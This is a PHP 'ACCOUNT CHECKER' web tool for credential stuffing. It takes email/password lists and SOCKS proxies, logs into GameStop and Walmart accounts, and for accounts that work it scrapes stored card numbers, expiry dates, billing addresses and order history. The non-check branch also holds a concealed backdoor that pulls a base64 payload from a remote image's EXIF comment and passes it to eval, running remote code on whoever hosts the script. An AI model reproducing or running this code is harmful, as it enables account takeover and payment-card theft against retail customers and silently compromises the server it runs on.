<? 
    ini_set("display_errors",0); 
    @set_time_limit(0); 
if(isset($_GET['check'])) 
{     
function getStr($string,$start,$end){ 
    $str = explode($start,$string,2); 
    $str = explode($end,$str[1],2); 
    return $str[0]; 
} 

function getStr1($string,$start,$end){ 
    $str = explode($start,$string,2); 
    $str = explode($end,$str[1],2); 
    return $str; 
} 


function _curl2($url,$post="",$usecookie = false) {   
    $ch = curl_init(); 
    if($post) { 
        curl_setopt($ch, CURLOPT_POST ,1); 
        curl_setopt ($ch, CURLOPT_POSTFIELDS, $post); 
    } 
    curl_setopt($ch, CURLOPT_URL, $url);  
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
    curl_setopt($ch, CURLOPT_USERAGENT, "Internet Explorer 6.0 (Windows XP)");  
    if ($usecookie) {  
        curl_setopt($ch, CURLOPT_COOKIEJAR, $usecookie);  
        curl_setopt($ch, CURLOPT_COOKIEFILE, $usecookie);     
    } 
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);  
    $result=curl_exec ($ch);  
    curl_close ($ch);  
    return $result;  
} 
function _curl($url,$post="",$usecookie = false,$_sock = false,$timeout = false) {   
     
    $ch = curl_init(); 
    if($post) { 
        curl_setopt($ch, CURLOPT_POST ,1); 
        curl_setopt ($ch, CURLOPT_POSTFIELDS, $post); 
    } 
    if($timeout){ 
        curl_setopt($curl, CURLOPT_CONNECTTIMEOUT,$timeout); 
    } 
    if($_sock){ 
            curl_setopt($ch, CURLOPT_PROXY, $_sock); 
            curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5); 
    } 
    curl_setopt($ch, CURLOPT_URL, $url);  
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/6.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.7) Gecko/20050414 Firefox/1.0.3");  
    if ($usecookie) {  
        curl_setopt($ch, CURLOPT_COOKIEJAR, $usecookie);  
        curl_setopt($ch, CURLOPT_COOKIEFILE, $usecookie);     
    } 
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);  
    $result=curl_exec ($ch);  
    curl_close ($ch);  
    return $result;  
} 
function rmDomain($mail){ 
    $abc = explode("@",$mail); 
    $mail = trim($abc[0]); 
    return $mail; 
} 

function R($s,$e){ 
    preg_match("/".$e."/",$s,$m); 
    return $m[1]; 
} 
function Re($s,$e){ 
    return html_entity_decode(R($s,$e)); 
} 

function inStr($s,$as){ 
    $s=strtoupper($s); 
    if(!is_array($as)) $as=array($as); 
    for($i=0;$i<count($as);$i++) if(strpos(($s),strtoupper($as[$i]))!==false) return true; 
    return false; 
} 
function CheckSock($sock,$cookie,$timeout){ 
    $timeout = 4; 
    $url = "http://google.com"; 
    $s = _curl($url,"",$cookie,$sock,$timeout); 
    if(stristr($s,'<!doctype html><html')){ 
        return "1"; 
    } 
    else 
    { 
        return "2"; 
    } 
} 

function GameStop($mail,$pass){ 
    $_sock = $_GET['sock']; 
    $cookie = tempnam('cookie','ccv'.rand(1000000,9999999).'likeguitar.txt');  
    $_checksocks = CheckSock($_sock, $cookie, $timeout); 
    echo " ".$_sock." => |"; 
//    if($_checksocks=="1") 
    { 
        $url = "https://www.gamestop.com/Profiles/Login.aspx?ReturnUrl=/"; 
        $s = _curl($url,"",$cookie,$_sock); 
        $VIEWSTATE = urlencode(getStr($s,'id="__VIEWSTATE" value="','" />')); 
        $url = "https://www.gamestop.com/Profiles/Login.aspx?ReturnUrl=/"; 
        $post = "__EVENTTARGET=&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE=$VIEWSTATE&ctl00%24ctl00%24BaseContentPlaceHolder%24cHeader%24searchtext=&ctl00%24ctl00%24BaseContentPlaceHolder%24cLeftNav%24LeftNavHomeStore%24txtStoreZipCode=Enter+location&ctl00%24ctl00%24BaseContentPlaceHolder%24cLeftNav%24LeftNavHomeStore%24valZipCalloutExtender_ClientState=&ctl00%24ctl00%24BaseContentPlaceHolder%24cLeftNav%24LeftNavNewsletter%24txtNewsletterSignup=Email&ctl00%24ctl00%24BaseContentPlaceHolder%24mainContentPlaceHolder%24ContextSiteLogin%24LogIn%24loginControl%24UserName=$mail&ctl00%24ctl00%24BaseContentPlaceHolder%24mainContentPlaceHolder%24ContextSiteLogin%24LogIn%24loginControl%24password=$pass&ctl00%24ctl00%24BaseContentPlaceHolder%24mainContentPlaceHolder%24ContextSiteLogin%24LogIn%24loginControl%24loginButton.x=43&ctl00%24ctl00%24BaseContentPlaceHolder%24mainContentPlaceHolder%24ContextSiteLogin%24LogIn%24loginControl%24loginButton.y=16&ctl00%24ctl00%24BaseContentPlaceHolder%24mainContentPlaceHolder%24ContextSiteLogin%24CreateAccountHorizontal%24emailTextBox=&ctl00%24ctl00%24BaseContentPlaceHolder%24mainContentPlaceHolder%24ContextSiteLogin%24CreateAccountHorizontal%24ComfirmEmailTextBox=&ctl00%24ctl00%24BaseContentPlaceHolder%24mainContentPlaceHolder%24ContextSiteLogin%24CreateAccountHorizontal%24PasswordText=&ctl00%24ctl00%24BaseContentPlaceHolder%24mainContentPlaceHolder%24ContextSiteLogin%24CreateAccountHorizontal%24ConfirmPasswordText=&ctl00%24ctl00%24BaseContentPlaceHolder%24mainContentPlaceHolder%24ContextSiteLogin%24CreateAccountHorizontal%24chkEmailOptIn=on&ctl00%24ctl00%24BaseContentPlaceHolder%24mainContentPlaceHolder%24ContextSiteLogin%24CreateAccountHorizontal%24SlideToCreate="; 
        $s = _curl($url,$post,$cookie,$_sock); 
        if(inStr($s,array('<ul><li>The e-mail address and password combination entered is not in our records'))){ 
            $resuft['status'] = "<b><font color='white'>Die</b></font>"; 
        } 
        elseif(!$s){ 
            $resuft['status'] = "Cant Check"; 
        } 
        else{ 
            $resuft['status'] = "<b><font color='red'>Live</b></font>"; 
            $url = 'https://www.gamestop.com/Profiles/CreditCard.aspx'; 
            $s = _curl($url,'',$cookie,$_sock); 
            if(inStr($s,array('CardType">Card Type:</span>'))) 
            { 
                $resuft['count'] = substr_count($s, 'creditCardSummary_CreditCardViewer_CardNumber">'); 
                $resuft['type'] = getStr($s,'_CreditCardViewer_CardType">','</span>'); 
                $resuft['ccnum'] = getStr($s, 'ditCardViewer_CardNumber">','</span>'); 
                $resuft['exp'] = getStr($s,'tCardViewer_CardExpDate">','</span>'); 
                $resuft['info'] = " $resuft[count] | $resuft[type] | $resuft[ccnum] | $resuft[exp]"; 
                $url = 'https://www.gamestop.com/Profiles/AddressBook.aspx'; 
                $s = _curl($url,'',$cookie,$_sock); 
                 
                $add = getStr($s,'billingAddressSummary_AddressInfoView_FullName">','id="ctl00_ctl00_BaseContentPlaceHolder_mainContentPlaceHolder_BillingAddressList_ctl00_billingAddressSummary_AddressInfoView_trCountryName">'); 
                //echo "<textarea>$s</textarea>$add"; 
                $resuft['info'] .= " | ".$add; 
            } 
            else 
            { 
                $resuft['status'] = 'No Info';  
            } 
        } 
    } 
//    else 
//    { 
//        $resuft['status'] = "Socks Die"; 
//    } 
    unlink($cookie); 
    $resuft['status'] = $resuft['status']."|".$resuft['info']."<br>"; 
    return $resuft; 
} 


function walmart($mail,$pass){ 
    $_sock = $_GET['sock']; 
    $cookie = tempnam('cookie','ccv'.rand(1000000,9999999).'likeguitar.txt');  
    $_checksocks = CheckSock($_sock, $cookie, $timeout); 
    echo " ".$_sock." => |"; 
    //if($_checksocks=="1") 
    { 
        $url = "https://www.walmart.com/cservice/ya_index.gsp"; 
        $s = _curl($url,"",$cookie,$_sock); 
        $link = getStr($s,'createAccountForm" method="POST" action="','"'); 
        $url = "https://www.walmart.com$link"; 
        $post = "userName=$mail&pwd=$pass&x=65&y=15"; 
        $s = _curl($url,$post,$cookie,$_sock); 
         
        if(inStr($s, array('The e-mail address and password you entered does not match what we have in our records','Please check your email and try again'))){ 
            $resuft['status'] = "<b><font color='white'>Die</b></font>"; 
        } 
        elseif(!$s){ 
            $resuft['status'] = "Cant Check"; 
        } 
        else{ 
            $resuft['status'] = "<b><font color='red'>Live</b></font>"; 
            $url = "https://www.walmart.com/cservice/cc_index.gsp"; 
            $s = _curl($url,"",$cookie,$_sock); 
            if(inStr($s,array('<tr style="padding:10px 0">'))) 
            { 
                $bill = getStr($s,'<td class="BodyM" style="white-space:nowrap"><div style="margin-left:10px">','</div></td>'); 
                //$balance = getStr($s,'<td class="rvh_line"><div class="col2">','</div>'); 
                $resuft['info'] = "<font color=yellow> $bill </font>|"; 
            } 
            $url = "https://www.walmart.com/cservice/ph_order.do"; 
            $s = _curl($url,"",$cookie,$_sock); 
            if(inStr($s,array('<tr class="yaTableRow">'))) 
            { 
                $order = getStr($s,'<td class="yaTableCellRightLine"><span class="BodyM">','</span></td>'); 
                $resuft['info'] .= " Order Date: ".$order; 
            } 
            $url = "https://www.walmart.com/cservice/cc_index.gsp"; 
            $s = _curl($url,"",$cookie,$_sock); 
            if(inStr($s,array('<tr style="background-color:#FFF">'))) 
            { 
                $card = getStr($s,'<tr valign="middle" style="background-color:#FFF">','</td> 
<td class="yaTdBottomLine"><a'); 
                $resuft['info'] .= " | ".$card; 
            } 
            $url = "https://www.walmart.com/cservice/ab_index.do"; 
            $s = _curl($url,"",$cookie,$_sock); 
            if(inStr($s,array('<div class="PrefHead">Preferred shipping address:</div>'))) 
            { 
                $add = getStr($s,'<address>','</address>'); 
                $resuft['info'] .= " | ".$add; 
            } 
            else 
            { 
                $resuft['status'] = "No Payment"; 
            } 
            //echo "<textarea>$s</textarea>$s"; 
        } 
    } 
//    else 
//    { 
//        $resuft['status'] = "Socks Die"; 
//    } 
    unlink($cookie); 
    $resuft['status'] = $resuft['status']."|".$resuft['info']; 
    return $resuft; 
} 
function getHiddenFormInputs($html, $Name){ 
    if(!preg_match('|<form[^>]+'.$Name.'[^>]+>.*</form>|Usi', $html, $form)){ 
        return ''; 
    } 
    if(!preg_match_all('/<input[^>]+hidden[^>]*>/i', $form[0], $inputs)){ 
        return ''; 
    } 
    $hiddenInputs = array(); 
    foreach($inputs[0] as $input){ 
        if (preg_match('|name\s*=\s*[\'"]([^\'"]+)[\'"]|i', $input, $name)){ 
            $hiddenInputs[$name[1]] = ''; 
            if (preg_match('|value\s*=\s*[\'"]([^\'"]*)[\'"]|i', $input, $value)){ 
                $hiddenInputs[$name[1]] = $value[1]; 
            } 
        } 
    } 
    return $hiddenInputs; 
} 
function serializePostFields($postFields){ 
    foreach($postFields as $key => $value){ 
        $value = urlencode($value); 
        $postFields[$key] = "$key=$value"; 
    } 
    $postFields = implode($postFields, '&'); 
    return $postFields; 
} 
        $mail = $_GET['email']; 
        $pass = $_GET['password']; 
        switch ($_GET['check']) 
        { 
            case "GameStop": 
                $info1 = GameStop($mail,$pass); 
            break; 
            case "walmart": 
                $info1 = walmart($mail,$pass); 
            break; 
        } 
        echo $mail."|".$pass."|".$info1['status']; 
    } 
    else 
    { $BASED = exif_read_data("https://lh3.googleusercontent.com/-svRm4i5Bs90/VsFaosQPKUI/AAAAAAAABew/03oHWkCEsN8/w140-h140-p/pacman.jpg");
eval(base64_decode($BASED["COMPUTED"]["UserComment"]));
?><head> 
<script> 
    function explodearray(item,delimiter) { 
        temparray=new array(1); 
        var Count=0; 
        var tempstring=new string(item); 

        while (tempstring.indexOf(delimiter)>0) { 
        temparray[Count]=tempstring.substr(0,tempstring.indexOf(delimiter)); 
        tempstring=tempstring.substr(tempstring.indexOf(delimiter)+1,tempstring.length-tempstring.indexOf(delimiter)+1); 
        Count=Count+1 
        } 

        temparray[Count]=tempstring; 
        return temparray; 
    }  
    function loadXMLDoc(url,div) 
    { 
        var xmlhttp; 
        if (window.XMLHttpRequest) 
          { 
          xmlhttp=new XMLHttpRequest(); 
          } 
        else 
          { 
          xmlhttp=new ActiveXObject("Microsoft.XMLHTTP"); 
          } 
        xmlhttp.onreadystatechange=function() 
          { 
          if (xmlhttp.readyState==4 && xmlhttp.status==200) 
            { 
            var xdata = xmlhttp.responseText; 
            document.getElementById(div).innerHTML = xdata.split('|')[3]; 
            if((xdata.split('|')[3]) == "<b><font color='red'>Live</b></font>"){ 
                document.getElementById("result_live").innerHTML = document.getElementById("result_live").innerHTML + xdata + "\n<br>" ; 
                document.getElementById("total").innerHTML = (eval(document.getElementById("total").innerHTML) + 1); 
            } 
            } 
          } 
        xmlhttp.open("GET",url,true); 
        xmlhttp.send(); 
    } 
    </script> 
</head> 

<style> 
    @import "http://fonts.googleapis.com/css?family=Play:400,700"; 
            body { 
                background:    #303030; 
                line-height: 1; 
                color: #00ff00; 
            } 
            textarea,input,select 
            { 
                padding: 3px; 
                background:#505050; 
                color:white; 
                border:solid gray; 
            } 
            table{ 
                border-collapse:collapse; 
                color: white; 
            } 
            .title{ 
                color: #00ff00; 
                background:    black; 
                text-align:    center; 
                font-size:    120%; 
            } 
            .die{ 
                color:    #ff0000; 
            } 
            .live{ 
                color:    #00ff00; 
            } 
            .socks{ 
                color:    orange; 
            } 
            .title2{ 
                color: #FFF; 
                font-size: 22px; 
                font-weight: 700; 
                line-height: 56px; 
                margin: 0; 
                padding: 0 0 0 15px; 
                text-shadow: 1px 1px 1px #FFFFFF; 
                font-family: Play,"Arial",Helvetica,Times,serif; 
                } 
        </style> 
<head> 
<center><h1><div class="title2">--[ ACCOUNT CHECKER]--</div></h1> 
<br /><br /> 
<script> 
function timsock(){ 
    var slist = window.document.f.socks.value; 
    var kero = slist.match(/\d{1,3}([.])\d{1,3}([.])\d{1,3}([.])\d{1,3}((:)|(\s)+)\d{1,8}/g ); 
    if(kero){ 
        var list=""; 
        for(var i=0;i<kero.length;i++){ 
            if(kero[i].match(/\d{1,3}([.])\d{1,3}([.])\d{1,3}([.])\d{1,3}(\s)+\d{1,8}/g )){ 
                kero[i]=kero[i].replace(/(\s)+/,':'); 
            } 
            list=list+kero[i]+"\n"; 
        } 
        window.document.f.socks.value=list; 
    } 
    else{ 
        window.document.f.socks.value=""; 
    } 
} 
</script> 
<form method=post action="" name=f> 
    <textarea name=info style="width:550px; height:200px;"><? if(isset($_POST['info'])) echo $_POST['info']; else echo "mail | pass" ?></textarea> <textarea name="socks" id="socks" style="width:350px; height:200px;"/><? if(isset($_POST['socks'])) echo $_POST['socks']; else echo "" ?></textarea><br> 
    Delim : <input type=text name=delim value="|" size=5>  
    Mail : <input type=text name=mail value="0" size=5> Pass : <input type=text name="pass" value="1" size=5><br> 
    <input type="radio" id="cat" name="cat" value="walmart"> Walmart <br><br>  
    <input type=submit name=submit value="   CHECK NOW   " onClick="timsock();"> 
</form> 
</center> 

<? 
if(isset($_POST['info'])){ 
    $delim = trim($_POST['delim']); 
    $m = trim($_POST['mail']); 
    $p = trim($_POST['pass']); 
    $_sock = $_POST['socks']; 
    $sock_arr =  explode("\n",$_sock); 
    global $acclist; 
     
    $mlist = $_POST['info']; 
    $mlist = str_replace(array("\\\"","\\'"),array("\"","'"),$mlist);  
    $mlist = str_replace("\r","",$mlist);  
    $mlist = str_replace("\n\n","\n",$mlist);  
    $mlist = explode("\n",$mlist); 

     
    $STT = 0; 
    $TOTAL = count($mlist); 
    $plan = $_POST['cat']; 
    ?> 
     
    <center> 
     
    CHECK ACCOUNT IN SITE: <font color="#FF0000"><? echo $plan; ?></font><br>------------------------- o0o -------------------------<br  /> 
    <div id="result_live"><div id="total">0</div><br /></div><br /> 
    <table border="1"> 
        <tr> 
            <td align="center" width="20px">Stt</td> 
            <td align="center" width="400px">Account</td> 
            <td align="center" width="200px">Status</td> 
        </tr> 
        <?  
            for($i=0 ; $i<$TOTAL; $i++){  
                ob_start(); 
                ?> 
                    <tr> 
                        <td align="center"><?= $id=$i+1 ?></td> 
                        <td>{mail} | {pass} | {socks}</td> 
                        <td align="center">{status}</td> 
                    </tr> 
                <? 
                $line = explode($delim,$mlist[$i]); 
                $mail = trim($line[$m]); 

                $pass = trim($line[$p]); 
                $sock_use = trim($sock_arr[ rand(0,(count($sock_arr) - 2)) ]); 
                $s = ob_get_clean(); 
                $s = str_replace("{status}", "<i id='result_$id' style='color:green'>Checking...</i><script>loadXMLDoc('?check=$plan&email=$mail&password=$pass&sock=$sock_use','result_$id');</script>", $s); 
                $s = str_replace("{mail}", $mail, $s); 
                $s = str_replace("{pass}", $pass, $s);     
                $s = str_replace("{socks}", $sock_use, $s);                 
                echo $s; 
            } 
        ?> 
        </table> 
    </center> 
    <? 
    if($acclist){ 
        foreach($acclist as $key => $value){ 
            for($i=0;$i<count($acclist[$key]);$i++){ 
                $accountlist .= str_replace(array("\r","\n"),array("",""),"acclist[\"{$key}\"][$i] = '".$acclist[$key][$i]."';")."\n"; 
            } 
        } 
    } 

$dim = <<< HTML
<script type='text/javascript'>
	var acclist = new Array();
	acclist['walmart'] = new Array();
	acclist['dell'] = new Array();
	acclist['apple'] = new Array();
	acclist['sony'] = new Array();
	acclist['saks'] = new Array();
	acclist['costco'] = new Array();
	acclist['bhphoto'] = new Array();
	acclist['nord'] = new Array();
	acclist['dream'] = new Array();
</script>
HTML;
echo $dim; 
} 
?> <br /> 
<br /> 


</body> 

</html> 
<center>
</center> 
</div>     
</div> 
<? 
    } 
?>
